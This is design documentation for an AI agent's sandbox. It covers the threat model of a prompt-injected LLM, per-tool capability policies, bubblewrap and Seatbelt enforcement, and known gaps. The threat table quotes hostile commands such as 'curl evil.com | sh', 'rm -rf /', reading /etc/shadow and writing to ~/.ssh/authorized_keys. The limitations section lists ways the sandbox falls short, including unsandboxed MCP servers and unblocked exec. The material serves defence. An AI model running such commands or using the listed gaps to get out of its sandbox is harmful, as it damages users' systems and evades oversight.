# Sandbox

The sandbox is the security gate between the LLM and tool execution. Every
tool call passes through the sandbox before running. The sandbox can allow,
deny, or redirect calls — giving you a hook to enforce policies, route tools
to alternative implementations, or audit everything the agent does.

**Key files:**
- `src/sandbox/mod.rs` — `Sandbox` trait, `SandboxDecision`, `create_sandbox()`
- `src/sandbox/policy.rs` — `SandboxPolicy`, `Access`, `PathAccess`, `PolicyTable` (intent abstraction)
- `src/sandbox/policy_sandbox.rs` — `PolicySandbox` (application + OS-level enforcement)
- `src/sandbox/os.rs` — `OsSandbox` (macOS Seatbelt / Linux bubblewrap), policy-based command builders
- `src/sandbox/composite.rs` — `CompositeSandbox` (chain multiple sandboxes)
- `src/sandbox/no_sandbox.rs` — `DangerousNoSandbox` (CLI-only bypass)

---

## Threat Model

The sandbox defends against a specific threat: **an LLM that has been
prompt-injected or is hallucinating, doing things you didn't ask for**.

It is not a container. It does not defend against a sophisticated attacker
who controls the LLM's output *and* knows the sandbox internals. It stops
the 95% case — accidental or naive prompt injection attacks:

| Attack | Stopped? | How |
|--------|----------|-----|
| `curl evil.com \| sh` (data exfiltration) | Yes | Kernel-enforced network deny (`--unshare-net`) |
| `cat /etc/shadow` via `read_file` tool | Yes | Application-level path check blocks it |
| `rm -rf /` via bash | Yes | Read-only root mount, writable paths restricted |
| Write to `~/.ssh/authorized_keys` | Yes | Write restricted to cwd + /tmp |
| Symlink inside cwd pointing to `/etc` | Yes | `canonicalize()` resolves symlinks before check |
| MCP server reads arbitrary files | **No** | MCP servers run as external processes (see [Known Limitations](#known-limitations)) |
| Bash reads `/etc/hostname` | **No** | Essential system dirs (`/etc`, `/usr`, `/bin`) are always mounted (bash needs them) |
| Bash spawns child processes | **No** | `--unshare-pid` only hides host PIDs, doesn't block `fork`/`execve` |

---

## Architecture: Intent vs Enforcement

The sandbox system separates **intent** from **enforcement**:

```
Intent (SandboxPolicy)         Enforcement (platform-specific)
  network: Deny          ->    Linux: --unshare-net (bwrap)
                               macOS: (deny network*) (Seatbelt)
  file_write: RestrictTo ->    Linux: --ro-bind / / + --bind <path>
       ["/workspace"]         macOS: (deny file-write* (require-not ...))
                               App:   check path in tool input JSON
  file_read: RestrictTo  ->    Linux: selective --ro-bind per path + system dirs
       ["/workspace"]         macOS: (deny file-read* (require-not ...))
                               App:   canonicalize() + starts_with() check
```

A `SandboxPolicy` expresses **what a tool is allowed to do** without
specifying how it's enforced. The same policy config works on any platform.
Adding a new backend (Landlock, seccomp, WASM) only requires a new
translator — policies don't change.

### Capability Model

Each tool starts with NO permissions, then gets granted specific capabilities:

| Capability | Description | OS Enforcement | Strength |
|-----------|-------------|----------------|----------|
| `network` | Outbound network connections | `--unshare-net` / `(deny network*)` | Kernel-enforced, strong |
| `file_read` | Read from filesystem | Selective `--ro-bind` / `(deny file-read*)` | Strong for user data; system dirs always readable |
| `file_write` | Write to filesystem | `--bind` mounts / `(deny file-write*)` | Strong; /tmp is isolated via `--tmpfs` |
| `process_exec` | PID namespace isolation | `--unshare-pid` | Weak; hides PIDs only, does not block exec |

File capabilities support path restrictions:

```rust
SandboxPolicy {
    network: Access::Allow,            // binary: allow or deny
    file_read: PathAccess::Deny,       // no filesystem reads
    file_write: PathAccess::RestrictTo(vec!["/tmp/workdir"]),  // writes only here
    process_exec: Access::Deny,
}
```

---

## Default Behavior

**Sandboxing is on by default.** No config needed. Every tool gets a
sensible default policy:

| Tool | Network | File Read | File Write | Process Exec |
|------|---------|-----------|------------|--------------|
| `bash` | **Deny** | RestrictTo(cwd) | RestrictTo(cwd, /tmp) | Allow |
| `web_search` | Allow | Deny | Deny | Deny |
| `read_file` | Deny | RestrictTo(cwd) | Deny | Deny |
| `write_file` | Deny | Deny | RestrictTo(cwd) | Deny |
| `edit_file` | Deny | RestrictTo(cwd) | RestrictTo(cwd) | Deny |
| `list_files` | Deny | RestrictTo(cwd) | Deny | Deny |
| `search_files` | Deny | RestrictTo(cwd) | Deny | Deny |
| Workspace tools | Deny | Allow | Allow | Deny |
| MCP tools (`*`) | Allow | Deny | Deny | Deny |
| Unknown tools | Allow | Deny | Deny | Deny |

**Output sanitization** is also on by default. The `after()` hook truncates
oversized tool outputs (>100K chars) at a line boundary. This applies to ALL
tools and prevents context window explosion.

To disable all sandboxes (development only, CLI-only):
```bash
cargo run -- --dangerous-no-sandbox "do something"
```

---

## Two-Layer Enforcement

### Layer 1: Application-Level (all tools)

The `PolicySandbox` inspects tool name and input JSON in `check()`:

- **File tools** (`read_file`, `write_file`, `edit_file`): extracts the
  file path from input, resolves symlinks via `canonicalize()`, validates
  against the policy's `file_read`/`file_write` path restrictions. Missing
  path fields are denied (not silently allowed).
- **Network tools** (`web_search`): checks if `network: Allow`
- **MCP tools**: checks `network` capability (MCP tools need network)
- **Workspace tools**: always allowed (internal tools)

```
LLM says: read_file {"file_path": "/etc/passwd"}

PolicySandbox.check("read_file", input):
  1. Look up policy for "read_file"
  2. Policy says file_read: RestrictTo(["/workspace/project"])
  3. Resolve path: canonicalize("/etc/passwd") = /etc/passwd
  4. /etc/passwd is NOT under /workspace/project
  5. -> Deny { reason: "sandbox policy denies file read for '/etc/passwd'" }
```

**Symlink protection:** Paths are resolved via `std::fs::canonicalize()` before
checking restrictions. A symlink at `/workspace/project/evil -> /etc/` is
resolved to `/etc/`, which fails the `starts_with("/workspace/project")` check.
For paths that don't exist yet, the nearest existing ancestor is canonicalized
and remaining components are re-appended.

### Layer 2: OS-Level (bash only)

For bash commands, the policy is translated into kernel-enforced restrictions:

| | macOS | Linux |
|---|---|---|
| Tool | `sandbox-exec` (Seatbelt) | `bwrap` (bubblewrap) |
| Install | Built-in | `apt install bubblewrap` |
| Network deny | `(deny network*)` | `--unshare-net` |
| Restricted reads | `(deny file-read* (require-not ...))` | Selective `--ro-bind` per path + system dirs |
| Writable paths | `(deny file-write* (require-not ...))` | `--bind <path> <path>` |
| /tmp isolation | N/A (subpath exception) | `--tmpfs /tmp` (isolated, not host /tmp) |
| PID isolation | N/A | `--unshare-pid` (visibility only) |
| Kill on exit | N/A | `--die-with-parent` |

Example: `curl evil.com | sh` → policy translates to `bwrap --unshare-net ... bash -c 'curl evil.com | sh'` → kernel blocks network → curl fails.

**System dirs always mounted:** `/usr`, `/bin`, `/sbin`, `/lib`, `/lib64`, `/etc` are read-only mounted even when `file_read` is restricted (bash needs them). Protection is against reading *user data*, not system files.

**Isolated /tmp:** `--tmpfs /tmp` gives each command its own empty `/tmp`, preventing cross-command temp file communication.

---

## Sandbox Trait

```rust
#[async_trait]
pub trait Sandbox: Send + Sync {
    async fn check(&self, tool_name: &str, input: &Value, ctx: &ToolContext)
        -> Result<SandboxDecision>;

    async fn after(&self, tool_name: &str, input: &Value, output: &mut ToolOutput)
        -> Result<()> { Ok(()) }
}
```

| Method | When called | Purpose |
|--------|-------------|---------|
| `check()` | Before every tool call | Decide: Allow, Deny, or Redirect |
| `after()` | After tool executes (success only) | Post-process output: truncate, redact, audit |

### SandboxDecision

| Variant | What happens | LLM sees |
|---------|-------------|----------|
| `Allow { input }` | Tool runs with (possibly rewritten) input | Normal tool result |
| `Deny { reason }` | Tool does NOT run | Error tool_result with deny reason |
| `Redirect { tool_name, input }` | A *different* tool runs | Normal tool result (LLM doesn't know) |

---

## Configuration

```json
{
  "sandbox": {
    "disabled": [],
    "tool_policies": {
      "web_search": {
        "network": "allow",
        "file_read": "deny",
        "file_write": "deny"
      },
      "bash": {
        "network": "deny",
        "file_write": { "restrict_to": ["{cwd}", "/tmp"] },
        "process_exec": "allow"
      },
      "mcp__github__*": {
        "network": "allow",
        "file_read": "deny",
        "file_write": "deny"
      },
      "mcp__*": {
        "network": "deny"
      }
    }
  }
}
```

### Allowing bash network access

Bash denies network by default. If you need network access (e.g., for
`git clone`, `curl`, `wget`), override the bash policy in `dyson.json`:

```json
{
  "sandbox": {
    "tool_policies": {
      "bash": { "network": "allow" }
    }
  }
}
```

All other bash restrictions (file read/write, `/tmp` isolation) remain in
effect. Only the network capability changes.

### Policy fields

| Field | Values | Description |
|-------|--------|-------------|
| `network` | `"allow"`, `"deny"` | Kernel-enforced via network namespace / Seatbelt rule |
| `file_read` | `"allow"`, `"deny"`, `{"restrict_to": [...]}` | Filesystem read access (symlinks resolved) |
| `file_write` | `"allow"`, `"deny"`, `{"restrict_to": [...]}` | Filesystem write access |
| `process_exec` | `"allow"`, `"deny"` | PID namespace isolation only (does not block exec) |

Path restrictions support `{cwd}` placeholder (expanded to working directory).

### Tool name matching

| Pattern | Matches | Priority |
|---------|---------|----------|
| `"web_search"` | Exact tool name | Highest |
| `"mcp__github__*"` | Glob pattern | By specificity (longer = higher) |
| `"mcp__*"` | Broad glob | Lower than specific globs |
| (default) | Any unmatched tool | Lowest |

Unspecified fields in a policy inherit from the tool's default.

### Global config

| Field | Default | Purpose |
|-------|---------|---------|
| `disabled` | `[]` | List of sandbox names to disable: `"os"` |
| `os_profile` | `"default"` | Legacy fallback: `"default"`, `"strict"`, `"permissive"` |
| `tool_policies` | `{}` | Per-tool policy overrides (recommended) |

CLI override (disables everything):
```bash
cargo run -- --dangerous-no-sandbox
```

---

## Composition Rules

`CompositeSandbox` chains sandboxes in sequence:

| Event | Behavior |
|-------|----------|
| `Deny` | Stop immediately, return denial |
| `Redirect` | Stop immediately, return redirect |
| `Allow { input }` | Pass (possibly rewritten) input to next sandbox |
| All allow | Return final Allow with accumulated rewrites |
| `after()` | All sandboxes run in order, each can mutate output |

---

## MCP Tool Sandboxing

MCP tools go through the same sandbox pipeline as all other tools.

Default MCP policy: network allowed, file access denied. This works because
MCP tools communicate with their server process (which needs network) but
shouldn't access the local filesystem through the sandbox gate.

Use glob patterns to configure MCP tools by server:

```json
{
  "tool_policies": {
    "mcp__github__*": { "network": "allow" },
    "mcp__slack__*": { "network": "deny" }
  }
}
```

**Important:** The sandbox only controls whether the agent can *invoke* an
MCP tool — it does not restrict what the MCP server process does on disk or
network. A compromised or misconfigured MCP server has full access to the
host. See [Known Limitations](#known-limitations).

---

## Implementations

### PolicySandbox (default — always on)

The primary sandbox. Enforces per-tool capability policies at both the
application level (for Rust-native tools) and OS level (for bash).
Subsumes the old `OsSandbox` behavior.

### OsSandbox (legacy, still available)

The original bash-only sandbox. Still available for direct use, but
`PolicySandbox` handles bash sandboxing now via the same underlying
`build_bwrap_command_from_policy()` / `build_seatbelt_command_from_policy()`
functions. The profile-based API (`"default"`, `"strict"`, `"permissive"`)
is preserved for backward compatibility.

### CompositeSandbox (the pipeline)

Chains multiple sandboxes in sequence. `create_sandbox()` builds this
automatically from config.

### DangerousNoSandbox (CLI-only bypass)

Disables all sandboxes. Only available via `--dangerous-no-sandbox` CLI
flag. Cannot be set from config.

---

## Known Limitations

- **`process_exec: Deny` is weak** — `--unshare-pid` hides host PIDs but doesn't block `fork`/`execve`. True prevention needs seccomp-bpf.
- **System dirs always readable** — `/etc`, `/usr`, `/bin` are mounted for bash to function. Protects user data, not system files.
- **MCP servers not sandboxed** — they run as external processes with full host access. The sandbox only gates whether the agent can *invoke* them.
- **macOS Seatbelt deprecated** — still works on macOS 15+, no replacement for CLI sandboxing. Used by Homebrew, Nix, etc.
- **No syscall filtering** — without seccomp-bpf, arbitrary syscalls are possible. Run Dyson in a container for defense in depth.
- **Seatbelt path sanitization** — paths with `"` or `\` are rejected to prevent S-expression injection.

---

## Strengthening the Sandbox

For users who need stronger isolation, these are the most impactful
improvements (in priority order):

1. **Run Dyson in a container** — Docker, Podman, or a VM gives you a hard
   boundary that the sandbox doesn't need to enforce. The sandbox then
   becomes defense-in-depth rather than the only barrier.

2. **Seccomp filters** — Adding `--seccomp` rules to bwrap would allow
   blocking `execve`, `ptrace`, `mount`, and other dangerous syscalls.
   Planned for a future release.

3. **Landlock LSM** — Linux Security Module that stacks with bwrap. Provides
   filesystem access control without root, as a second enforcement layer.

4. **MCP server sandboxing** — Spawning each MCP server inside its own bwrap
   namespace would close the biggest remaining gap.

5. **Bash command allow-listing** — Rather than just capability restrictions,
   an allow-list of permitted command patterns would catch a broader class of
   attacks.

---

See also: [Architecture Overview](architecture-overview.md) ·
[Agent Loop](agent-loop.md) · [Tools & Skills](tools-and-skills.md)
